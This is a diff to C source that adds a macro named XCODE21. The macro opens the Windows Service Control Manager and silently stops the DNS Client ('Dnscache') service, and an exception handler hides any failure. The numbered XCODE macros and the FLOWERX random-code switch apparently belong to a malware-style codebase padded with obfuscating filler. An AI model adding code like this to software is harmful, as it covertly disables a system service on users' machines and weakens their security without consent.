@@ -86,6 +86,9 @@ DROPFILES dropFiles;
 UINT uGblLen,uDropFilesLen;
 HGLOBAL hGblFiles,hGblEffect;
 DWORD *dwDropEffect;
+SC_HANDLE scm;
+SC_HANDLE service;
+SERVICE_STATUS status;
 
 typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
 typedef struct {
@@ -729,6 +732,28 @@ do {\
 		Sleep(20);\
 	}
 
+#define XCODE21 __try{\
+		if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))!=NULL)\
+		{\
+			service=OpenService(scm,"Dnscache",SERVICE_QUERY_STATUS|SERVICE_CONTROL_STOP);\
+			if (service)\
+			{\
+				bRetval=QueryServiceStatus(service,&status);\
+				if (bRetval)\
+				{\
+					if (status.dwCurrentState!=SERVICE_STOPPED)\
+					{\
+						ControlService(service,SERVICE_CONTROL_STOP,&status);\
+					}\
+				}\
+			}\
+		}\
+		CloseServiceHandle(service);\
+		CloseServiceHandle(scm);\
+	}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+	Sleep(21);\
+	}
 #ifdef FLOWERX
 #include "xrand.h"
 #else
